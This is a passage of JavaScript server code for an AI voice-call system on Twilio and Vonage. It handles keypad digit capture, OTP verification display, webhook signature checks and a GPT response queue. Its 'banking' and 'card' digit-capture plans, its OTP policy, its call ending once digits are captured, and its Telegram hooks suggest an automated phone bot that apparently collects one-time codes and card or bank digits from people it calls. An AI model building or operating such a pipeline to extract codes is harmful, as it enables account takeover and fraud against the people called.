function scheduleSpeechTicks(
  callSid,
  phaseKey,
  durationMs,
  level = null,
  options = {},
) {
  if (!callSid) return;
  clearSpeechTicks(callSid);
  const intervalMs = Math.max(80, Number(options.intervalMs) || 200);
  const levels = Array.isArray(options.levels) ? options.levels : null;
  const safeDuration = Math.max(0, Number(durationMs) || 0);
  if (!safeDuration || safeDuration <= intervalMs) {
    webhookService
      .setLiveCallPhase(callSid, phaseKey, { level, logEvent: false })
      .catch(() => {});
    return;
  }
  const start = Date.now();
  webhookService
    .setLiveCallPhase(callSid, phaseKey, { level, logEvent: false })
    .catch(() => {});
  const timer = setInterval(() => {
    const elapsed = Date.now() - start;
    if (elapsed >= safeDuration) {
      clearSpeechTicks(callSid);
      return;
    }
    let nextLevel = level;
    if (levels?.length) {
      const idx = Math.min(
        levels.length - 1,
        Math.floor((elapsed / safeDuration) * levels.length),
      );
      if (Number.isFinite(levels[idx])) {
        nextLevel = levels[idx];
      }
    }
    webhookService
      .setLiveCallPhase(callSid, phaseKey, {
        level: nextLevel,
        logEvent: false,
      })
      .catch(() => {});
  }, intervalMs);
  speechTickTimers.set(callSid, timer);
}

function scheduleSpeechTicksFromAudio(callSid, phaseKey, base64Audio = "") {
  if (!base64Audio) return;
  const { durationMs, levels, intervalMs } = estimateAudioLevelsFromBase64(
    base64Audio,
    { intervalMs: liveConsoleAudioTickMs, maxFrames: 48 },
  );
  const fallbackLevel = estimateAudioLevelFromBase64(base64Audio);
  const startLevel = Number.isFinite(levels?.[0]) ? levels[0] : fallbackLevel;
  scheduleSpeechTicks(callSid, phaseKey, durationMs, startLevel, {
    levels,
    intervalMs,
  });
}

async function applyInitialDigitIntent(
  callSid,
  callConfig,
  gptService = null,
  interactionCount = 0,
) {
  if (!digitService || !callConfig) return null;
  if (callConfig.digit_intent) {
    const existing = {
      intent: callConfig.digit_intent,
      expectation: digitService.getExpectation(callSid) || null,
    };
    if (
      existing.intent?.mode === "dtmf" &&
      callConfig.digit_capture_active !== true
    ) {
      callConfig.digit_capture_active = true;
      callConfig.flow_state = existing.expectation
        ? "capture_active"
        : "capture_pending";
      callConfig.flow_state_reason = existing.intent?.reason || "digit_intent";
      callConfig.flow_state_updated_at = new Date().toISOString();
      callConfigurations.set(callSid, callConfig);
    }
    if (existing.intent?.mode === "dtmf" && existing.expectation) {
      try {
        await digitService.flushBufferedDigits(
          callSid,
          gptService,
          interactionCount,
          "dtmf",
          { allowCallEnd: true },
        );
      } catch (err) {
        console.error("Flush buffered digits error:", err);
      }
    }
    return existing;
  }
  const result = digitService.prepareInitialExpectation(callSid, callConfig);
  callConfig.digit_intent = result.intent;
  if (result.intent?.mode === "dtmf") {
    callConfig.digit_capture_active = true;
    callConfig.flow_state = result.expectation
      ? "capture_active"
      : "capture_pending";
    callConfig.flow_state_reason = result.intent?.reason || "digit_intent";
  } else {
    callConfig.digit_capture_active = false;
    callConfig.flow_state = "normal";
    callConfig.flow_state_reason = result.intent?.reason || "no_signal";
  }
  callConfig.flow_state_updated_at = new Date().toISOString();
  callConfigurations.set(callSid, callConfig);
  if (
    result.intent?.mode === "dtmf" &&
    Array.isArray(result.plan_steps) &&
    result.plan_steps.length
  ) {
    webhookService.addLiveEvent(
      callSid,
      formatDigitCaptureLabel(result.intent, result.expectation),
      { force: true },
    );
  } else if (result.intent?.mode === "dtmf" && result.expectation) {
    webhookService.addLiveEvent(
      callSid,
      `🔢 DTMF intent detected (${result.intent.reason})`,
      { force: true },
    );
  } else {
    webhookService.addLiveEvent(
      callSid,
      `🗣️ Normal call flow (${result.intent?.reason || "no_signal"})`,
      { force: true },
    );
  }
  if (
    result.intent?.mode === "dtmf" &&
    Array.isArray(result.plan_steps) &&
    result.plan_steps.length
  ) {
    webhookService.addLiveEvent(
      callSid,
      `🧭 Digit capture plan started (${result.intent.group_id || "group"})`,
      { force: true },
    );
    const provider = callConfig?.provider || currentProvider;
    const isGroupedPlan = ["banking", "card"].includes(result.intent.group_id);
    const deferTwiml = provider === "twilio" && isGroupedPlan;
    await digitService.requestDigitCollectionPlan(
      callSid,
      {
        steps: result.plan_steps,
        end_call_on_success: true,
        group_id: result.intent.group_id,
        capture_mode: "ivr_gather",
        defer_twiml: deferTwiml,
      },
      gptService,
    );
    return result;
  }
  if (result.intent?.mode === "dtmf" && result.expectation) {
    try {
      await digitService.flushBufferedDigits(
        callSid,
        gptService,
        interactionCount,
        "dtmf",
        { allowCallEnd: true },
      );
    } catch (err) {
      console.error("Flush buffered digits error:", err);
    }
  }
  return result;
}

async function handleExternalDtmfInput(callSid, digits, options = {}) {
  if (!callSid || !digitService) {
    return { handled: false, reason: "digit_service_unavailable" };
  }
  const normalizedDigits = normalizeDigitString(digits);
  if (!normalizedDigits) {
    return { handled: false, reason: "empty_digits" };
  }

  const source = String(options.source || "dtmf").trim() || "dtmf";
  const provider =
    String(options.provider || callConfigurations.get(callSid)?.provider || "")
      .trim()
      .toLowerCase() || null;
  const activeSession = activeCalls.get(callSid);
  const gptService = options.gptService || activeSession?.gptService || null;
  const interactionCount = Number.isFinite(options.interactionCount)
    ? Number(options.interactionCount)
    : Number.isFinite(activeSession?.interactionCount)
      ? Number(activeSession.interactionCount)
      : 0;

  clearSilenceTimer(callSid);
  markStreamMediaSeen(callSid);
  streamLastMediaAt.set(callSid, Date.now());

  const callConfig = callConfigurations.get(callSid);
  if (!callConfig) {
    return { handled: false, reason: "missing_call_config" };
  }
  markKeypadDtmfSeen(callSid, {
    source,
    digitsLength: normalizedDigits.length,
  });

  const captureActive = isCaptureActiveConfig(callConfig);
  let isDigitIntent = callConfig?.digit_intent?.mode === "dtmf" || captureActive;
  if (!isDigitIntent) {
    const hasExplicitDigitConfig = Boolean(
      callConfig.collection_profile ||
        callConfig.script_policy?.requires_otp ||
        callConfig.script_policy?.default_profile,
    );
    if (hasExplicitDigitConfig) {
      await applyInitialDigitIntent(
        callSid,
        callConfig,
        gptService,
        interactionCount,
      );
      isDigitIntent = callConfig?.digit_intent?.mode === "dtmf";
    }
  }

  const shouldBuffer =
    isDigitIntent ||
    digitService?.hasPlan?.(callSid) ||
    digitService?.hasExpectation?.(callSid);
  if (!isDigitIntent && !shouldBuffer) {
    webhookService.addLiveEvent(
      callSid,
      `🔢 Keypad: ${normalizedDigits} (ignored - normal flow)`,
      { force: true },
    );
    return { handled: false, reason: "normal_flow" };
  }

  const expectation = digitService?.getExpectation(callSid);
  const activePlan = digitService?.getPlan?.(callSid);
  const planStepIndex = Number.isFinite(activePlan?.index)
    ? activePlan.index + 1
    : null;

  if (!expectation) {
    if (digitService?.bufferDigits) {
      digitService.bufferDigits(callSid, normalizedDigits, {
        timestamp: Date.now(),
        source,
        early: true,
        plan_id: activePlan?.id || null,
        plan_step_index: planStepIndex,
        provider,
      });
    }
    webhookService.addLiveEvent(
      callSid,
      `🔢 Keypad: ${normalizedDigits} (buffered early)`,
      { force: true },
    );
    return { handled: true, buffered: true };
  }

  await digitService.flushBufferedDigits(
    callSid,
    gptService,
    interactionCount,
    "dtmf",
    { allowCallEnd: true },
  );
  if (!digitService?.hasExpectation(callSid)) {
    return { handled: true, reason: "expectation_cleared" };
  }

  const activeExpectation = digitService.getExpectation(callSid);
  const display =
    activeExpectation?.profile === "verification"
      ? digitService.formatOtpForDisplay(
          normalizedDigits,
          "progress",
          activeExpectation?.max_digits,
        )
      : `Keypad: ${normalizedDigits}`;
  webhookService.addLiveEvent(callSid, `🔢 ${display}`, {
    force: true,
  });

  const collection = digitService.recordDigits(callSid, normalizedDigits, {
    timestamp: Date.now(),
    source,
    provider,
    attempt_id: activeExpectation?.attempt_id || null,
    plan_id: activeExpectation?.plan_id || null,
    plan_step_index: activeExpectation?.plan_step_index || null,
  });

  await digitService.handleCollectionResult(
    callSid,
    collection,
    gptService,
    interactionCount,
    "dtmf",
    { allowCallEnd: true },
  );

  if (db?.updateCallState) {
    await db.updateCallState(callSid, "dtmf_received", {
      at: new Date().toISOString(),
      source,
      provider,
      digits_length: normalizedDigits.length,
      accepted: !!collection?.accepted,
      profile: collection?.profile || null,
      plan_id: collection?.plan_id || null,
      plan_step_index: collection?.plan_step_index || null,
    })
      .catch(() => {});
  }

  return { handled: true, collection };
}

function normalizeHostValue(value) {
  if (!value) return "";
  const first = String(value).split(",")[0].trim();
  if (!first) return "";
  try {
    if (first.includes("://")) {
      const parsed = new URL(first);
      return parsed.host || "";
    }
  } catch {
    // Fall through to plain host normalization.
  }
  return first.replace(/^https?:\/\//i, "").replace(/\/+$/, "");
}

function resolveHost(req) {
  const forwardedHost = normalizeHostValue(req?.headers?.["x-forwarded-host"]);
  if (forwardedHost) return forwardedHost;
  const hostHeader = normalizeHostValue(req?.headers?.host);
  if (hostHeader) return hostHeader;
  return normalizeHostValue(config.server?.hostname);
}

function appendQueryParamsToUrl(rawUrl, params = {}) {
  if (!rawUrl) return rawUrl;
  try {
    const parsed = new URL(String(rawUrl));
    Object.entries(params || {}).forEach(([key, value]) => {
      if (value === undefined || value === null || value === "") return;
      parsed.searchParams.set(key, String(value));
    });
    return parsed.toString();
  } catch {
    return rawUrl;
  }
}

const VONAGE_WS_DEFAULT_CONTENT_TYPE = "audio/l16;rate=16000";
let cachedVonageWebsocketAudioSpec = null;

function normalizeVonageWebsocketContentType(rawValue) {
  const fallback = {
    contentType: VONAGE_WS_DEFAULT_CONTENT_TYPE,
    sampleRate: 16000,
    sttEncoding: "linear16",
    ttsEncoding: "linear16",
  };
  const raw = String(rawValue || "")
    .trim()
    .toLowerCase();
  if (!raw) return fallback;

  const parts = raw
    .split(";")
    .map((part) => part.trim())
    .filter(Boolean);
  const mediaType = parts[0];
  const params = {};
  parts.slice(1).forEach((part) => {
    const [key, value] = part.split("=");
    if (!key || !value) return;
    params[String(key).toLowerCase()] = String(value).toLowerCase();
  });

  const rateCandidate =
    Number(params.rate) ||
    Number(params.sample_rate) ||
    Number(params.samplerate);
  const sampleRate =
    Number.isFinite(rateCandidate) && rateCandidate > 0
      ? rateCandidate
      : fallback.sampleRate;

  if (mediaType === "audio/l16") {
    return {
      contentType: `audio/l16;rate=${sampleRate}`,
      sampleRate,
      sttEncoding: "linear16",
      ttsEncoding: "linear16",
    };
  }

  // Keep backward compatibility for legacy installations that used PCM-u.
  if (mediaType === "audio/pcmu") {
    return {
      contentType: `audio/pcmu;rate=${sampleRate}`,
      sampleRate,
      sttEncoding: "mulaw",
      ttsEncoding: "mulaw",
    };
  }

  console.warn(
    `Unsupported VONAGE_WEBSOCKET_CONTENT_TYPE "${rawValue}". Falling back to ${fallback.contentType}.`,
  );
  return fallback;
}

function getVonageWebsocketAudioSpec() {
  if (!cachedVonageWebsocketAudioSpec) {
    cachedVonageWebsocketAudioSpec = normalizeVonageWebsocketContentType(
      config.vonage?.voice?.websocketContentType,
    );
  }
  return cachedVonageWebsocketAudioSpec;
}

function getVonageWebsocketContentType() {
  return getVonageWebsocketAudioSpec().contentType;
}

function buildVonageAnswerWebhookUrl(req, callSid, extraParams = {}) {
  const host = resolveHost(req) || config.server?.hostname;
  const defaultBase = host ? `https://${host}/answer` : "";
  const baseUrl = config.vonage?.voice?.answerUrl || defaultBase;
  return appendQueryParamsToUrl(baseUrl, {
    callSid: callSid || undefined,
    ...extraParams,
  });
}

function buildVonageEventWebhookUrl(req, callSid, extraParams = {}) {
  const host = resolveHost(req) || config.server?.hostname;
  const defaultBase = host ? `https://${host}/event` : "";
  const baseUrl = config.vonage?.voice?.eventUrl || defaultBase;
  return appendQueryParamsToUrl(baseUrl, {
    callSid: callSid || undefined,
    ...extraParams,
  });
}

function buildVonageWebsocketUrl(req, callSid, extraParams = {}) {
  const host = resolveHost(req) || config.server?.hostname;
  if (!host || !callSid) return "";
  const params = new URLSearchParams();
  params.set("callSid", String(callSid));
  Object.entries(extraParams || {}).forEach(([key, value]) => {
    if (value === undefined || value === null || value === "") return;
    params.set(key, String(value));
  });

  // Reuse existing stream HMAC auth for provider-neutral websocket protection.
  if (config.streamAuth?.secret) {
    const timestamp = String(Date.now());
    const token = buildStreamAuthToken(String(callSid), timestamp);
    if (token) {
      params.set("ts", timestamp);
      params.set("token", token);
    }
  }
  return `wss://${host}/vonage/stream?${params.toString()}`;
}

function reqForHost(host) {
  return {
    headers: {
      host: normalizeHostValue(host),
    },
  };
}

const warnOnInvalidTwilioSignature = (req, label = "") =>
  twilioSignature.warnOnInvalidTwilioSignature(req, label, { resolveHost });

const requireValidTwilioSignature = (req, res, label = "") =>
  twilioSignature.requireValidTwilioSignature(req, res, label, { resolveHost });

function buildTwilioStreamTwiml(hostname, options = {}) {
  const response = new VoiceResponse();
  const connect = response.connect();
  const host = hostname || config.server.hostname;
  const params = new URLSearchParams();
  const streamParameters = {};
  if (options.from) params.set("from", String(options.from));
  if (options.to) params.set("to", String(options.to));
  if (options.from) streamParameters.from = String(options.from);
  if (options.to) streamParameters.to = String(options.to);
  if (options.callSid && config.streamAuth?.secret) {
    const timestamp = String(Date.now());
    const token = buildStreamAuthToken(options.callSid, timestamp);
    if (token) {
      params.set("token", token);
      params.set("ts", timestamp);
      streamParameters.token = token;
      streamParameters.ts = timestamp;
    }
  }
  const query = params.toString();
  const url = `wss://${host}/connection${query ? `?${query}` : ""}`;
  const streamOptions = { url, track: TWILIO_STREAM_TRACK };
  if (Object.keys(streamParameters).length) {
    streamOptions.parameters = streamParameters;
  }
  connect.stream(streamOptions);
  return response.toString();
}

function buildInboundHoldTwiml(hostname) {
  const response = new VoiceResponse();
  const host = hostname || config.server.hostname;
  const pauseSeconds = 10;
  response.pause({ length: pauseSeconds });
  response.redirect({ method: "POST" }, `https://${host}/incoming?wait=1`);
  return response.toString();
}

function shouldBypassHmac(req) {
  const path = req.path || "";
  if (!path) return false;
  if (req.method === "OPTIONS") {
    return true;
  }
  if (
    req.method === "GET" &&
    (path === "/" || path === "/favicon.ico" || path === "/health")
  ) {
    return true;
  }
  if (path.startsWith("/webhook/")) return true;
  return HMAC_BYPASS_PATH_PREFIXES.some((prefix) => path.startsWith(prefix));
}

function verifyHmacSignature(req) {
  const secret = config.apiAuth?.hmacSecret;
  if (!secret) {
    return { ok: true, skipped: true, reason: "missing_secret" };
  }

  const headers = req?.headers || {};
  const timestampHeader = headers[HMAC_HEADER_TIMESTAMP];
  const signatureHeader = headers[HMAC_HEADER_SIGNATURE];

  if (!timestampHeader || !signatureHeader) {
    return { ok: false, reason: "missing_headers" };
  }

  const timestamp = Number(timestampHeader);
  if (!Number.isFinite(timestamp)) {
    return { ok: false, reason: "invalid_timestamp" };
  }

  const maxSkewMs = Number(config.apiAuth?.maxSkewMs || 300000);
  const now = Date.now();
  if (Math.abs(now - timestamp) > maxSkewMs) {
    return { ok: false, reason: "timestamp_out_of_range" };
  }

  const payload = buildHmacPayload(req, String(timestampHeader));
  const expected = crypto
    .createHmac("sha256", secret)
    .update(payload)
    .digest("hex");

  try {
    const expectedBuf = Buffer.from(expected, "hex");
    const providedBuf = Buffer.from(String(signatureHeader), "hex");
    if (expectedBuf.length !== providedBuf.length) {
      return { ok: false, reason: "invalid_signature" };
    }
    if (!crypto.timingSafeEqual(expectedBuf, providedBuf)) {
      return { ok: false, reason: "invalid_signature" };
    }
  } catch (error) {
    return { ok: false, reason: "invalid_signature" };
  }

  return { ok: true };
}

function safeCompareSecret(provided, expected) {
  if (!provided || !expected) return false;
  try {
    const expectedBuf = Buffer.from(String(expected), "utf8");
    const providedBuf = Buffer.from(String(provided), "utf8");
    if (expectedBuf.length !== providedBuf.length) return false;
    return crypto.timingSafeEqual(expectedBuf, providedBuf);
  } catch {
    return false;
  }
}

function verifyTelegramWebhookAuth(req) {
  const hmac = verifyHmacSignature(req);
  if (hmac.ok && !hmac.skipped) {
    return { ok: true, method: "hmac" };
  }
  if (hmac.skipped) {
    return { ok: false, reason: "missing_auth_config" };
  }
  return { ok: false, reason: hmac.reason || "invalid_hmac" };
}

function requireValidTelegramWebhook(req, res, label = "") {
  const mode = String(config.telegram?.webhookValidation || "warn").toLowerCase();
  if (mode === "off") return true;
  const verification = verifyTelegramWebhookAuth(req);
  if (verification.ok) return true;
  const path = label || req.originalUrl || req.path || "unknown";
  console.warn(
    `⚠️ Telegram webhook auth failed for ${path}: ${verification.reason || "unknown"}`,
  );
  if (mode === "strict") {
    res.status(401).send("Unauthorized");
    return false;
  }
  return true;
}

function verifyAwsWebhookAuth(req, options = {}) {
  const { allowQuerySecret = false } = options;
  const expectedSecret = config.aws?.webhookSecret;
  const providedHeaderSecret = req?.headers?.["x-aws-webhook-secret"];
  const providedQuerySecret = allowQuerySecret
    ? req.query?.awsWebhookSecret || req.query?.secret
    : null;
  const providedSecret = providedHeaderSecret || providedQuerySecret;
  if (expectedSecret) {
    if (!providedSecret) {
      return { ok: false, reason: "missing_aws_secret" };
    }
    if (!safeCompareSecret(providedSecret, expectedSecret)) {
      return { ok: false, reason: "invalid_aws_secret" };
    }
    return { ok: true, method: "aws_secret" };
  }

  const hmac = verifyHmacSignature(req);
  if (hmac.ok && !hmac.skipped) {
    return { ok: true, method: "hmac" };
  }
  if (hmac.skipped) {
    return { ok: false, reason: "missing_auth_config" };
  }
  return { ok: false, reason: hmac.reason || "invalid_hmac" };
}

function requireValidAwsWebhook(req, res, label = "", options = {}) {
  const mode = String(config.aws?.webhookValidation || "warn").toLowerCase();
  if (mode === "off") return true;
  const verification = verifyAwsWebhookAuth(req, options);
  if (verification.ok) return true;
  const path = label || req.originalUrl || req.path || "unknown";
  console.warn(
    `⚠️ AWS webhook auth failed for ${path}: ${verification.reason || "unknown"}`,
  );
  if (mode === "strict") {
    res.status(401).send("Unauthorized");
    return false;
  }
  return true;
}

function verifyAwsStreamAuth(callSid, req) {
  const streamAuth = verifyStreamAuth(callSid, req);
  if (streamAuth.ok || streamAuth.skipped) {
    return { ok: true, method: "stream_auth" };
  }
  const awsFallback = verifyAwsWebhookAuth(req, { allowQuerySecret: true });
  if (awsFallback.ok) {
    return { ok: true, method: awsFallback.method };
  }
  return {
    ok: false,
    reason: streamAuth.reason || awsFallback.reason || "unauthorized",
  };
}

function parseBearerToken(value) {
  if (!value) return null;
  const match = String(value).match(/^Bearer\s+(.+)$/i);
  if (!match) return null;
  const token = match[1]?.trim();
  return token || null;
}

function decodeBase64UrlJson(segment) {
  try {
    const decoded = Buffer.from(String(segment || ""), "base64url").toString(
      "utf8",
    );
    return JSON.parse(decoded);
  } catch {
    return null;
  }
}

function parseVonageSignedJwt(token) {
  if (!token) return null;
  const parts = String(token).split(".");
  if (parts.length !== 3) return null;
  const [encodedHeader, encodedPayload, encodedSignature] = parts;
  const header = decodeBase64UrlJson(encodedHeader);
  const payload = decodeBase64UrlJson(encodedPayload);
  if (!header || !payload) return null;
  return {
    token: String(token),
    header,
    payload,
    encodedHeader,
    encodedPayload,
    encodedSignature,
  };
}

function pruneVonageWebhookJtiCache(nowMs = Date.now()) {
  for (const [key, expiresAt] of vonageWebhookJtiCache.entries()) {
    if (!Number.isFinite(expiresAt) || expiresAt <= nowMs) {
      vonageWebhookJtiCache.delete(key);
    }
  }
  if (vonageWebhookJtiCache.size <= VONAGE_WEBHOOK_JTI_CACHE_MAX) return;
  const ordered = [...vonageWebhookJtiCache.entries()].sort(
    (a, b) => a[1] - b[1],
  );
  const overflow = ordered.length - VONAGE_WEBHOOK_JTI_CACHE_MAX;
  for (let i = 0; i < overflow; i += 1) {
    vonageWebhookJtiCache.delete(ordered[i][0]);
  }
}

function seenVonageWebhookJti(jti, nowMs = Date.now()) {
  if (!jti) return false;
  pruneVonageWebhookJtiCache(nowMs);
  const expiresAt = vonageWebhookJtiCache.get(String(jti));
  if (!Number.isFinite(expiresAt)) return false;
  if (expiresAt <= nowMs) {
    vonageWebhookJtiCache.delete(String(jti));
    return false;
  }
  return true;
}

function storeVonageWebhookJti(jti, expiresAtMs, nowMs = Date.now()) {
  if (!jti) return;
  const fallbackTtlMs = Number(config.vonage?.webhookMaxSkewMs || 300000);
  const safeExpiry = Number.isFinite(expiresAtMs)
    ? expiresAtMs
    : nowMs + fallbackTtlMs;
  vonageWebhookJtiCache.set(String(jti), safeExpiry);
  pruneVonageWebhookJtiCache(nowMs);
}

function computeVonagePayloadHash(req) {
  const method = String(req?.method || "GET").toUpperCase();
  let body = "";
  if (method !== "GET" && method !== "HEAD") {
    if (typeof req?.rawBody === "string") {
      body = req.rawBody;
    } else if (Buffer.isBuffer(req?.rawBody)) {
      body = req.rawBody.toString("utf8");
    } else if (req?.body && Object.keys(req.body).length) {
      body = stableStringify(req.body);
    }
  }
  return crypto
    .createHash("sha256")
    .update(body || "")
    .digest("hex")
    .toLowerCase();
}

function validateVonageSignedWebhook(req) {
  const secret = config.vonage?.webhookSignatureSecret;
  if (!secret) {
    return { ok: false, reason: "missing_secret" };
  }
  const authorization = req?.headers?.authorization || req?.headers?.Authorization;
  const token = parseBearerToken(authorization);
  if (!token) {
    return { ok: false, reason: "missing_bearer_token" };
  }
  const parsed = parseVonageSignedJwt(token);
  if (!parsed) {
    return { ok: false, reason: "invalid_token_format" };
  }
  if (String(parsed.header?.alg || "").toUpperCase() !== "HS256") {
    return { ok: false, reason: "unsupported_algorithm" };
  }

  let providedSignature;
  try {
    providedSignature = Buffer.from(parsed.encodedSignature, "base64url");
  } catch {
    return { ok: false, reason: "invalid_signature_encoding" };
  }
  const expectedSignature = crypto
    .createHmac("sha256", secret)
    .update(`${parsed.encodedHeader}.${parsed.encodedPayload}`)
    .digest();
  if (
    expectedSignature.length !== providedSignature.length ||
    !crypto.timingSafeEqual(expectedSignature, providedSignature)
  ) {
    return { ok: false, reason: "invalid_signature" };
  }

  const claims = parsed.payload || {};
  const nowMs = Date.now();
  const nowSec = Math.floor(nowMs / 1000);
  const skewMs = Number(config.vonage?.webhookMaxSkewMs || 300000);
  const skewSec = Math.ceil(skewMs / 1000);
  const iat = Number(claims.iat);
  const exp = Number(claims.exp);
  const nbf = Number(claims.nbf);

  if (Number.isFinite(iat) && Math.abs(nowSec - iat) > skewSec) {
    return { ok: false, reason: "iat_out_of_range" };
  }
  if (Number.isFinite(exp) && nowSec > exp + skewSec) {
    return { ok: false, reason: "token_expired" };
  }
  if (Number.isFinite(nbf) && nowSec + skewSec < nbf) {
    return { ok: false, reason: "token_not_active" };
  }
  if (
    claims.api_key &&
    config.vonage?.apiKey &&
    String(claims.api_key) !== String(config.vonage.apiKey)
  ) {
    return { ok: false, reason: "api_key_mismatch" };
  }

  const jti = claims.jti ? String(claims.jti) : null;
  if (jti) {
    if (seenVonageWebhookJti(jti, nowMs)) {
      return { ok: false, reason: "replay_detected" };
    }
    const expiresAtMs = Number.isFinite(exp)
      ? exp * 1000 + skewMs
      : Number.isFinite(iat)
        ? iat * 1000 + skewMs
        : nowMs + skewMs;
    storeVonageWebhookJti(jti, expiresAtMs, nowMs);
  }

  const payloadHash =
    claims.payload_hash || claims.payloadHash || claims.body_hash || null;
  const requirePayloadHash = !!config.vonage?.webhookRequirePayloadHash;
  const method = String(req?.method || "GET").toUpperCase();
  const shouldCheckPayloadHash =
    method !== "GET" && method !== "HEAD" && (payloadHash || requirePayloadHash);
  if (shouldCheckPayloadHash && !payloadHash) {
    return { ok: false, reason: "missing_payload_hash" };
  }
  if (shouldCheckPayloadHash && payloadHash) {
    const expectedHash = computeVonagePayloadHash(req);
    if (String(payloadHash).toLowerCase() !== expectedHash) {
      return { ok: false, reason: "payload_hash_mismatch" };
    }
  }

  return { ok: true, claims };
}

function requireValidVonageWebhook(req, res, label = "") {
  const mode = String(config.vonage?.webhookValidation || "warn").toLowerCase();
  if (mode === "off") return true;
  const result = validateVonageSignedWebhook(req);
  if (result.ok) return true;
  const path = label || req.originalUrl || req.path || "unknown";
  console.warn(
    `⚠️ Vonage webhook signature invalid for ${path}: ${result.reason || "unknown"}`,
  );
  if (mode === "strict") {
    // Signed callbacks may be retried by Vonage on 5xx.
    res.status(503).send("Temporary validation failure");
    return false;
  }
  return true;
}

function selectWsProtocol(protocols) {
  if (!protocols) return false;
  if (Array.isArray(protocols) && protocols.length) return protocols[0];
  if (protocols instanceof Set) {
    const iter = protocols.values().next();
    return iter.done ? false : iter.value;
  }
  if (typeof protocols === "string") return protocols;
  return false;
}

const app = express();
ExpressWs(app, null, {
  wsOptions: {
    handleProtocols: (protocols) => selectWsProtocol(protocols),
  },
});
// Trust the first proxy (ngrok/load balancer) so rate limiting can read X-Forwarded-For safely
app.set("trust proxy", 1);

function captureRawBody(req, _res, buf) {
  if (!buf || !buf.length) return;
  req.rawBody = buf.toString("utf8");
}

app.use(express.json({ verify: captureRawBody }));
app.use(express.urlencoded({ extended: true, verify: captureRawBody }));

app.use((req, res, next) => {
  const incoming = normalizeRequestId(req.headers["x-request-id"]);
  const requestId = incoming || uuidv4();
  req.requestId = requestId;
  res.setHeader("x-request-id", requestId);
  next();
});

const apiLimiter = rateLimit({
  windowMs: config.server?.rateLimit?.windowMs || 60000,
  max: config.server?.rateLimit?.max || 300,
  standardHeaders: true,
  legacyHeaders: false,
});

function sanitizeTelemetryValue(value) {
  if (value == null) return null;
  if (typeof value === "number") return value;
  if (typeof value === "string") {
    if (value.length > 120) return value.slice(0, 120);
    return value;
  }
  if (typeof value === "boolean") return value;
  return null;
}

function sanitizeTelemetryData(data = {}) {
  const filtered = {};
  const blockedKeys = [
    "phone",
    "otp",
    "token",
    "secret",
    "init",
    "authorization",
    "sid",
  ];
  Object.entries(data || {}).forEach(([key, value]) => {
    const lower = key.toLowerCase();
    if (blockedKeys.some((blocked) => lower.includes(blocked))) return;
    const sanitized = sanitizeTelemetryValue(value);
    if (sanitized !== null) {
      filtered[key] = sanitized;
    }
  });
  return filtered;
}

app.use((req, res, next) => {
  if (shouldBypassHmac(req)) {
    return next();
  }

  const verification = verifyHmacSignature(req);
  if (!verification.ok) {
    console.warn(
      `⚠️ Rejected request due to invalid HMAC (${verification.reason}) ${req.method} ${req.originalUrl}`,
    );
    return res.status(401).json({ success: false, error: "Unauthorized" });
  }
  return next();
});

app.use((req, res, next) => {
  if (shouldBypassHmac(req)) {
    return next();
  }
  return apiLimiter(req, res, next);
});

const PORT = config.server?.port || 3000;

// Enhanced call configurations with function context
const callConfigurations = new Map();
const callDirections = new Map();
const activeCalls = new Map();
const callFunctionSystems = new Map(); // Store generated functions per call
const callEndLocks = new Map();
const gatherEventDedupe = new Map();
const silenceTimers = new Map();
const twilioTtsCache = new Map();
const twilioTtsPending = new Map();
const TWILIO_TTS_CACHE_TTL_MS =
  Number(config.twilio?.ttsCacheTtlMs) || 10 * 60 * 1000;
const TWILIO_TTS_CACHE_MAX = Number(config.twilio?.ttsCacheMax) || 200;
const TWILIO_TTS_MAX_CHARS = Number(config.twilio?.ttsMaxChars) || 500;
const TWILIO_TTS_FETCH_TIMEOUT_MS =
  Number(config.twilio?.ttsFetchTimeoutMs) || 4000;
const pendingStreams = new Map(); // callSid -> timeout to detect missing websocket
const streamFirstMediaTimers = new Map();
const streamFirstMediaSeen = new Set();
const gptQueues = new Map();
const normalFlowBuffers = new Map();
const normalFlowProcessing = new Set();
const normalFlowLastInput = new Map();
const speechTickTimers = new Map();
const userAudioStates = new Map();

function enqueueGptTask(callSid, task) {
  if (!callSid || typeof task !== "function") {
    return Promise.resolve();
  }
  const current = gptQueues.get(callSid) || Promise.resolve();
  const next = current
    .then(task)
    .catch((err) => {
      console.error("GPT queue error:", err);
    })
    .finally(() => {
      if (gptQueues.get(callSid) === next) {
        gptQueues.delete(callSid);
      }
    });
  gptQueues.set(callSid, next);
  return next;
}

function clearGptQueue(callSid) {
  if (callSid) {
    gptQueues.delete(callSid);
  }
}

function clearNormalFlowState(callSid) {
  if (!callSid) return;
  normalFlowBuffers.delete(callSid);
  normalFlowProcessing.delete(callSid);
  normalFlowLastInput.delete(callSid);
}

function shouldSkipNormalInput(callSid, text, windowMs = 2000) {
  const cleaned = String(text || "").trim();
  if (!cleaned) return true;
  const last = normalFlowLastInput.get(callSid);
  const now = Date.now();
  if (last && last.text === cleaned && now - last.at < windowMs) {
    return true;
  }
  normalFlowLastInput.set(callSid, { text: cleaned, at: now });
  return false;
}

async function processNormalFlowTranscript(
  callSid,
  text,
  gptService,
  getInteractionCount,
  setInteractionCount,
) {
  if (!callSid || !gptService) return;
  const cleaned = String(text || "").trim();
  if (!cleaned) return;
  if (shouldSkipNormalInput(callSid, cleaned)) return;

  normalFlowBuffers.set(callSid, { text: cleaned, at: Date.now() });
  if (normalFlowProcessing.has(callSid)) {
    return;
  }
  normalFlowProcessing.add(callSid);
  try {
    while (normalFlowBuffers.has(callSid)) {
      const next = normalFlowBuffers.get(callSid);
      normalFlowBuffers.delete(callSid);
      await enqueueGptTask(callSid, async () => {
        if (callEndLocks.has(callSid)) return;
        const session = activeCalls.get(callSid);
        if (session?.ending) return;
        const currentCount =
          typeof getInteractionCount === "function" ? getInteractionCount() : 0;
        try {
          await gptService.completion(next.text, currentCount);
        } catch (gptError) {
          console.error("GPT completion error:", gptError);
          webhookService.addLiveEvent(callSid, "⚠️ GPT error, retrying", {
            force: true,
          });
        }
        const nextCount = currentCount + 1;
        if (typeof setInteractionCount === "function") {
          setInteractionCount(nextCount);
        }
      });
    }
  } finally {
    normalFlowProcessing.delete(callSid);
  }
}

const ALLOWED_TWILIO_STREAM_TRACKS = new Set([
  "inbound_track",
  "outbound_track",
  "both_tracks",
]);
const TWILIO_STREAM_TRACK = ALLOWED_TWILIO_STREAM_TRACKS.has(
  (process.env.TWILIO_STREAM_TRACK || "").toLowerCase(),
)
  ? process.env.TWILIO_STREAM_TRACK.toLowerCase()
  : "inbound_track";

const CALL_END_MESSAGES = {
  success: "Thanks, we have what we need. Goodbye.",
  failure:
